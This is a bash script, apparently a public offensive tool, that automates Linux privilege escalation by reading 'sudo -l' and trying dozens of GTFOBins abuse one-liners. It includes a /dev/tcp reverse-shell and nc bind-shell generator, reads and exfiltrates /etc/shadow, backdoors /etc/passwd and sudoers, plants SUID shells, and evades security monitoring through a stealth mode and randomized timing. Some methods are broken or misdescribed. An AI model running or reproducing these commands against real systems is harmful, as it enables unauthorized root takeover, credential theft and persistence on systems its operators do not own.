#!/bin/bash
# Enhanced GTFOBins Privilege Escalation Script v2.0
# Created by Mrx0rd (https://github.com/Wael-Rd)
# Comprehensive automation of privilege escalation techniques with advanced features

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration
LOG_FILE="gtfobins_privesc_$(date +%Y%m%d_%H%M%S).log"
TIMEOUT=5 # Timeout for exploit attempts in seconds
MAX_PARALLEL=3 # Maximum number of parallel exploit attempts
STEALTH_MODE=false # Set to true for reduced output and minimal system impact
INTERACTIVE_MODE=false # Set to true for interactive exploit selection
SELF_UPDATE=false # Set to true to update exploits from GTFOBins
RANDOMIZE=true # Randomize exploit attempts to evade detection
CUSTOM_PAYLOAD="" # Custom payload to execute instead of /bin/sh

# Banner
show_banner() {
  cat << "EOF"

     _         _                           
    / \  _   _| |_ ___                     
   / _ \| | | | __/ _ \                    
  / ___ \ |_| | || (_) |                   
 /_/   \_\__,_|\__\___/          
           
   ____ _____ _____ ___  ____  _           
  / ___|_   _|  ___/ _ \| __ )(_)_ __  ___ 
 | |  _  | | | |_ | | | |  _ \| | '_ \/ __|
 | |_| | | | |  _|| |_| | |_) | | | | \__ \
  \____| |_| |_|   \___/|____/|_|_| |_|___/
                                           

                                                    
EOF
  echo -e "${BOLD}${CYAN}[*] Advanced GTFOBins Privilege Escalation Tool v2.0${NC}"
  echo -e "${BOLD}${CYAN}[*] Created by Mrx0rd (https://github.com/Wael-Rd)${NC}"
  echo -e "${BOLD}${CYAN}[*] Automated privilege escalation via sudo binary abuse${NC}"
  echo -e "${BOLD}${CYAN}[*] Log file: $LOG_FILE${NC}"
  echo
}

# Function to log messages
log_message() {
  local level=$1
  local message=$2
  local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
  
  case $level in
    "INFO") color=$GREEN ;;
    "WARN") color=$YELLOW ;;
    "ERROR") color=$RED ;;
    "SUCCESS") color=$BOLD$GREEN ;;
    *) color=$NC ;;
  esac
  
  echo -e "${color}[$(date +"%H:%M:%S")] [$level] $message${NC}"
  echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Function to check environment and adapt behavior
check_environment() {
  log_message "INFO" "Checking environment for optimal exploitation"
  
  # Check if we're in a container
  if grep -q docker /proc/1/cgroup 2>/dev/null || grep -q lxc /proc/1/cgroup 2>/dev/null; then
    log_message "INFO" "Container environment detected, adapting techniques"
    CONTAINER_ENV=true
  else
    CONTAINER_ENV=false
  fi
  
  # Check for monitoring/security tools
  if ps aux | grep -i "auditd\|osquery\|wazuh\|falco\|sysdig" | grep -v grep > /dev/null; then
    log_message "WARN" "Security monitoring detected, enabling stealth mode"
    STEALTH_MODE=true
  fi
  
  # Check system resources
  local mem_total=$(free -m | awk '/^Mem:/{print $2}')
  if [ "$mem_total" -lt 1000 ]; then
    log_message "WARN" "Low memory system detected, reducing parallel execution"
    MAX_PARALLEL=1
  fi
  
  # Check network connectivity for reverse shell options
  if ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; then
    NETWORK_AVAILABLE=true
  else
    NETWORK_AVAILABLE=false
    log_message "WARN" "Limited network connectivity, disabling reverse shell exploits"
  fi
}

# Function to update exploits from GTFOBins
update_from_gtfobins() {
  if [ "$SELF_UPDATE" != "true" ]; then
    return
  fi
  
  log_message "INFO" "Attempting to update exploits from GTFOBins"
  
  if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
    log_message "ERROR" "Neither curl nor wget available for updates"
    return
  fi
  
  local temp_file=$(mktemp)
  
  if command -v curl &>/dev/null; then
    curl -s -o "$temp_file" "https://gtfobins.github.io/" || {
      log_message "ERROR" "Failed to download GTFOBins data"
      rm -f "$temp_file"
      return
    }
  else
    wget -q -O "$temp_file" "https://gtfobins.github.io/" || {
      log_message "ERROR" "Failed to download GTFOBins data"
      rm -f "$temp_file"
      return
    }
  fi
  
  # Extract binary names from GTFOBins
  local new_bins=$(grep -o 'href="/gtfobins/[^"]*' "$temp_file" | cut -d'/' -f3 | sort -u)
  
  log_message "INFO" "Found $(echo "$new_bins" | wc -l) binaries from GTFOBins"
  
  # Clean up
  rm -f "$temp_file"
}

# Function to generate custom payloads
generate_payload() {
  local payload_type=$1
  local target_ip=$2
  local target_port=$3
  
  if [ -n "$CUSTOM_PAYLOAD" ]; then
    echo "$CUSTOM_PAYLOAD"
    return
  fi
  
  case $payload_type in
    "shell") 
      echo "/bin/bash -i"
      ;;
    "reverse_shell")
      if [ -z "$target_ip" ] || [ -z "$target_port" ]; then
        log_message "ERROR" "IP and port required for reverse shell"
        return ""
      fi
      echo "bash -c 'exec bash -i &>/dev/tcp/$target_ip/$target_port <&1'"
      ;;
    "bind_shell")
      if [ -z "$target_port" ]; then
        target_port=4444
      fi
      echo "nc -lvp $target_port -e /bin/bash"
      ;;
    "file_read")
      echo "cat /etc/shadow"
      ;;
    "file_write")
      echo "echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd"
      ;;
    *)
      echo "/bin/sh"
      ;;
  esac
}

# Function to categorize exploits
categorize_exploits() {
  declare -gA EXPLOIT_CATEGORIES
  
  EXPLOIT_CATEGORIES["shell"]="bash sh dash ksh csh zsh ash fish"
  EXPLOIT_CATEGORIES["file_read"]="cat less more head tail nl od hexdump xxd strings"
  EXPLOIT_CATEGORIES["file_write"]="tee cp mv sed awk perl python ruby"
  EXPLOIT_CATEGORIES["command_exec"]="awk perl python ruby php node irb lua"
  EXPLOIT_CATEGORIES["suid"]="chmod chown cp find install nmap"
  EXPLOIT_CATEGORIES["network"]="nc ncat socat curl wget"
  EXPLOIT_CATEGORIES["editors"]="vim nano emacs pico ed"
  EXPLOIT_CATEGORIES["language"]="python perl ruby php lua node"
  
  log_message "INFO" "Categorized exploits into ${#EXPLOIT_CATEGORIES[@]} categories"
}

# Function to check for sudo permissions
check_sudo_permissions() {
  if ! command -v sudo &>/dev/null; then
    log_message "ERROR" "sudo not found. Exiting."
    exit 1
  fi

  log_message "INFO" "Running 'sudo -l' to enumerate allowed binaries..."
  SUDO_LIST=$(sudo -l 2>/dev/null)
  echo "$SUDO_LIST" | tee -a "$LOG_FILE"

  # Extract allowed binaries from sudo -l output with improved regex
  BINARIES=$(echo "$SUDO_LIST" | grep -oP '(?<=\(root\)|NOPASSWD:|PASSWD:|SETENV:|!authenticate )\s*(/[^,; ]+)' | sed 's/^\s*//' | sort -u)

  if [ -z "$BINARIES" ]; then
    log_message "ERROR" "No allowed binaries found in sudo -l output. Exiting."
    exit 1
  fi

  log_message "SUCCESS" "Found $(echo "$BINARIES" | wc -l) allowed binaries"
  echo "$BINARIES"
}

# Map of GTFOBins techniques (multiple per binary)
declare -A GTFO_METHODS

# Initialize GTFOBins methods
initialize_gtfobins() {
  # Shell execution methods
  GTFO_METHODS[awk]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
  GTFO_METHODS[bash]='sudo bash'
  GTFO_METHODS[busybox]='sudo busybox sh'
  GTFO_METHODS[capsh]='sudo capsh --gid=0 --uid=0 --'
  GTFO_METHODS[dash]='sudo dash'
  GTFO_METHODS[docker]='sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh'
  GTFO_METHODS[env]='sudo env /bin/sh'
  GTFO_METHODS[expect]='sudo expect -c "spawn /bin/sh;interact"'
  GTFO_METHODS[find]='sudo find / -exec /bin/sh \; -quit'
  GTFO_METHODS[flock]='sudo flock -u / /bin/sh'
  GTFO_METHODS[gawk]="sudo gawk 'BEGIN {system(\"/bin/sh\")}'"  
  GTFO_METHODS[gdb]='sudo gdb -nx -ex "!sh" -ex quit'
  GTFO_METHODS[ionice]='sudo ionice /bin/sh'
  GTFO_METHODS[ksh]='sudo ksh'
  GTFO_METHODS[ld.so]='sudo LD_PRELOAD=/bin/sh ld.so'
  GTFO_METHODS[logsave]='sudo logsave /dev/null /bin/sh'
  GTFO_METHODS[lua]='sudo lua -e "os.execute(\"/bin/sh\")"'
  GTFO_METHODS[man]='sudo man -P "/bin/sh" man'
  GTFO_METHODS[mawk]="sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
  GTFO_METHODS[nice]='sudo nice /bin/sh'
  GTFO_METHODS[node]='sudo node -e "require(\"child_process\").exec(\"/bin/sh\")"'
  GTFO_METHODS[perl]='sudo perl -e "exec \"/bin/sh\""'
  GTFO_METHODS[php]='sudo php -r "system(\"/bin/sh\");"'
  GTFO_METHODS[python]='sudo python -c "import os; os.system(\"/bin/sh\")"'
  GTFO_METHODS[ruby]='sudo ruby -e "exec \"/bin/sh\""'
  GTFO_METHODS[setarch]='sudo setarch $(arch) /bin/sh'
  GTFO_METHODS[stdbuf]='sudo stdbuf -i0 /bin/sh'
  GTFO_METHODS[strace]='sudo strace -o /dev/null /bin/sh'
  GTFO_METHODS[taskset]='sudo taskset 1 /bin/sh'
  GTFO_METHODS[time]='sudo time /bin/sh'
  GTFO_METHODS[timeout]='sudo timeout --foreground 1d /bin/sh'
  GTFO_METHODS[unshare]='sudo unshare /bin/sh'
  GTFO_METHODS[xargs]='sudo xargs -a /dev/null /bin/sh'
  GTFO_METHODS[zsh]='sudo zsh'
  
  # File read methods
  GTFO_METHODS[cat]='sudo cat /etc/shadow'
  GTFO_METHODS[grep]='sudo grep -r "root:" /etc/shadow'
  GTFO_METHODS[head]='sudo head /etc/shadow'
  GTFO_METHODS[less]='sudo less /etc/shadow'
  GTFO_METHODS[more]='sudo more /etc/shadow'
  GTFO_METHODS[nl]='sudo nl /etc/shadow'
  GTFO_METHODS[od]='sudo od /etc/shadow'
  GTFO_METHODS[tail]='sudo tail /etc/shadow'
  GTFO_METHODS[xxd]='sudo xxd /etc/shadow'
  
  # File write/SUID methods
  GTFO_METHODS[chmod]='sudo chmod 4755 /bin/sh'
  GTFO_METHODS[chown]='sudo chown $(id -un):$(id -gn) /bin/sh'
  GTFO_METHODS[cp]='sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh'
  GTFO_METHODS[install]='sudo install -m =xs $(which sh) .'
  GTFO_METHODS[mv]='sudo mv /bin/sh /bin/mv && sudo chmod +s /bin/mv'
  GTFO_METHODS[tee]='echo "$USER ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers'
  
  # Editor methods
  GTFO_METHODS[emacs]='sudo emacs -Q -nw --eval "(term \"/bin/sh\")"'
  GTFO_METHODS[nano]='sudo nano -s /bin/sh'
  GTFO_METHODS[pico]='sudo pico -s /bin/sh'
  GTFO_METHODS[vim]='sudo vim -c ":!sh"'
  GTFO_METHODS[vi]='sudo vi -c ":!sh"'
  
  # Network methods
  GTFO_METHODS[curl]='sudo curl file:///etc/shadow'
  GTFO_METHODS[nc]='sudo nc -e /bin/sh 127.0.0.1 4444'
  GTFO_METHODS[socat]='sudo socat stdin exec:/bin/sh'
  GTFO_METHODS[wget]='sudo wget --post-file=/etc/shadow 127.0.0.1'
  
  # Package manager methods
  GTFO_METHODS[apt]='sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh'
  GTFO_METHODS[apt-get]='sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'
  GTFO_METHODS[dpkg]='sudo dpkg --configure -a --force-all'
  GTFO_METHODS[pip]='TF=$(mktemp -d) && echo "import os; os.system(\"/bin/sh\")" > $TF/setup.py && sudo pip install $TF'
  
  # Other methods
  GTFO_METHODS[aria2c]='sudo aria2c --on-download-error=/bin/sh'
  GTFO_METHODS[arp]='sudo arp -v /bin/sh'
  GTFO_METHODS[at]='echo "/bin/sh" | sudo at now'
  GTFO_METHODS[base64]='echo c3VkbyBzaA== | sudo base64 -d | sh'
  GTFO_METHODS[chroot]='sudo chroot / /bin/sh'
  GTFO_METHODS[crontab]='echo "* * * * * root /bin/sh" | sudo crontab -'
  GTFO_METHODS[dd]='sudo dd if=/etc/shadow of=/dev/stdout'
  GTFO_METHODS[git]='sudo git -p help config | less'
  GTFO_METHODS[make]='sudo make -s --eval="\nall:\n\t@/bin/sh\n"'
  GTFO_METHODS[nmap]='echo "os.execute(\"/bin/sh\")" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse'
  GTFO_METHODS[openssl]='sudo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=`/bin/sh`"'
  GTFO_METHODS[tar]='sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
  GTFO_METHODS[zip]='TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT "sh #"'
  
  log_message "INFO" "Initialized ${#GTFO_METHODS[@]} GTFOBins methods"
}

# Function to execute an exploit with timeout
execute_exploit() {
  local binary=$1
  local method=$2
  
  log_message "INFO" "Attempting: $method"
  
  # Create a temporary file for the exploit output
  local output_file=$(mktemp)
  
  # Execute the exploit with timeout
  timeout $TIMEOUT bash -c "$method" > "$output_file" 2>&1 &
  local pid=$!
  
  # Wait for the exploit to complete or timeout
  wait $pid
  local exit_code=$?
  
  # Check if we got root
  if grep -q "uid=0(root)" "$output_file"; then
    log_message "SUCCESS" "Got root shell via $binary!"
    cat "$output_file"
    rm -f "$output_file"
    return 0
  fi
  
  # Check if the exploit timed out
  if [ $exit_code -eq 124 ]; then
    log_message "WARN" "Exploit timed out after $TIMEOUT seconds"
  fi
  
  # Clean up
  rm -f "$output_file"
  return 1
}

# Function to try exploits in parallel
try_exploits_parallel() {
  local binaries=$1
  local pids=() # Array to store background process IDs
  local results=() # Array to store results
  local count=0
  
  # Create a temporary directory for results
  local temp_dir=$(mktemp -d)
  
  for BIN in $binaries; do
    BASE=$(basename "$BIN")
    
    if [[ -n "${GTFO_METHODS[$BASE]}" ]]; then
      IFS=';' read -ra METHODS <<< "${GTFO_METHODS[$BASE]}"
      
      for METHOD in "${METHODS[@]}"; do
        # If we've reached the maximum number of parallel processes, wait for one to finish
        if [ ${#pids[@]} -ge $MAX_PARALLEL ]; then
          wait -n # Wait for any child process to exit
          # Remove finished processes from the array
          for i in "${!pids[@]}"; do
            if ! kill -0 ${pids[$i]} 2>/dev/null; then
              unset pids[$i]
            fi
          done
          # Re-index the array
          pids=("${pids[@]}")
        fi
        
        # Execute the exploit in the background
        (
          log_message "INFO" "Testing $BASE with method: $METHOD"
          if execute_exploit "$BASE" "$METHOD"; then
            echo "SUCCESS:$BASE:$METHOD" > "$temp_dir/$BASE.result"
            exit 0
          else
            echo "FAIL:$BASE:$METHOD" > "$temp_dir/$BASE.result"
            exit 1
          fi
        ) &
        
        # Store the process ID
        pids+=("$!")
        count=$((count + 1))
        
        # If randomization is enabled, add a small random delay
        if [ "$RANDOMIZE" = "true" ]; then
          sleep 0.$(( RANDOM % 10 + 1 ))
        fi
      done
    else
      log_message "WARN" "No GTFOBins method mapped for $BASE."
    fi
  done
  
  # Wait for all remaining processes to finish
  for pid in "${pids[@]}"; do
    wait $pid
  done
  
  # Process results
  for result_file in "$temp_dir"/*.result; do
    if [ -f "$result_file" ]; then
      result=$(cat "$result_file")
      if [[ $result == SUCCESS:* ]]; then
        IFS=':' read -r status binary method <<< "$result"
        log_message "SUCCESS" "Successfully exploited $binary with method: $method"
        # Clean up and exit
        rm -rf "$temp_dir"
        return 0
      fi
    fi
  done
  
  # Clean up
  rm -rf "$temp_dir"
  log_message "ERROR" "All $count exploit attempts failed"
  return 1
}

# Function to run in interactive mode
run_interactive_mode() {
  log_message "INFO" "Starting interactive mode"
  
  # Display available binaries
  echo -e "${YELLOW}Available sudo binaries:${NC}"
  local i=1
  local bin_array=()
  
  for BIN in $BINARIES; do
    BASE=$(basename "$BIN")
    if [[ -n "${GTFO_METHODS[$BASE]}" ]]; then
      echo -e "$i) ${GREEN}$BASE${NC}"
      bin_array[$i]=$BASE
      i=$((i + 1))
    else
      echo -e "$i) ${RED}$BASE${NC} (no known exploits)"
      bin_array[$i]=$BASE
      i=$((i + 1))
    fi
  done
  
  # Prompt for binary selection
  echo -e "${YELLOW}Enter binary number to exploit (0 to try all):${NC}"
  read -r selection
  
  if [ "$selection" -eq 0 ]; then
    log_message "INFO" "Trying all binaries"
    try_exploits_parallel "$BINARIES"
    return $?
  elif [ "$selection" -ge 1 ] && [ "$selection" -lt $i ]; then
    local selected_bin=${bin_array[$selection]}
    log_message "INFO" "Selected binary: $selected_bin"
    
    if [[ -n "${GTFO_METHODS[$selected_bin]}" ]]; then
      IFS=';' read -ra METHODS <<< "${GTFO_METHODS[$selected_bin]}"
      
      echo -e "${YELLOW}Available methods for $selected_bin:${NC}"
      local j=1
      for METHOD in "${METHODS[@]}"; do
        echo -e "$j) $METHOD"
        j=$((j + 1))
      done
      
      echo -e "${YELLOW}Enter method number to try (0 to try all):${NC}"
      read -r method_selection
      
      if [ "$method_selection" -eq 0 ]; then
        for METHOD in "${METHODS[@]}"; do
          execute_exploit "$selected_bin" "$METHOD" && return 0
        done
      elif [ "$method_selection" -ge 1 ] && [ "$method_selection" -lt $j ]; then
        local selected_method=${METHODS[$((method_selection - 1))]}
        execute_exploit "$selected_bin" "$selected_method"
        return $?
      else
        log_message "ERROR" "Invalid method selection"
        return 1
      fi
    else
      log_message "ERROR" "No GTFOBins method mapped for $selected_bin"
      return 1
    fi
  else
    log_message "ERROR" "Invalid binary selection"
    return 1
  fi
}

# Main function
main() {
  show_banner
  
  # Parse command line arguments
  while [[ $# -gt 0 ]]; do
    case $1 in
      -i|--interactive)
        INTERACTIVE_MODE=true
        shift
        ;;
      -s|--stealth)
        STEALTH_MODE=true
        shift
        ;;
      -u|--update)
        SELF_UPDATE=true
        shift
        ;;
      -r|--randomize)
        RANDOMIZE=true
        shift
        ;;
      -p|--parallel)
        if [[ $2 =~ ^[0-9]+$ ]]; then
          MAX_PARALLEL=$2
          shift 2
        else
          log_message "ERROR" "--parallel requires a number"
          exit 1
        fi
        ;;
      -t|--timeout)
        if [[ $2 =~ ^[0-9]+$ ]]; then
          TIMEOUT=$2
          shift 2
        else
          log_message "ERROR" "--timeout requires a number"
          exit 1
        fi
        ;;
      --payload)
        CUSTOM_PAYLOAD=$2
        shift 2
        ;;
      -h|--help)
        echo "Usage: $0 [options]"
        echo "Options:"
        echo "  -i, --interactive    Run in interactive mode"
        echo "  -s, --stealth        Run in stealth mode (reduced output)"
        echo "  -u, --update         Update exploits from GTFOBins"
        echo "  -r, --randomize      Randomize exploit attempts"
        echo "  -p, --parallel N     Run N exploits in parallel (default: 3)"
        echo "  -t, --timeout N      Set timeout for exploits in seconds (default: 5)"
        echo "  --payload 'CMD'      Use custom payload instead of /bin/sh"
        echo "  -h, --help           Show this help message"
        echo ""
        exit 0
        ;;
      *)
        log_message "ERROR" "Unknown option: $1"
        exit 1
        ;;
    esac
  done
  
  # Initialize components
  check_environment
  initialize_gtfobins
  categorize_exploits
  update_from_gtfobins
  check_sudo_permissions
  
  # Run in interactive or automatic mode
  if [ "$INTERACTIVE_MODE" = "true" ]; then
    run_interactive_mode
  else
    log_message "INFO" "Running in automatic mode"
    try_exploits_parallel "$BINARIES"
  fi
  
  # Check if we succeeded
  if [ $? -eq 0 ]; then
    log_message "SUCCESS" "Privilege escalation successful!"
    exit 0
  else
    log_message "ERROR" "Failed to escalate privileges via GTFOBins methods"
    exit 1
  fi
}

# Run the main function
main "$@"
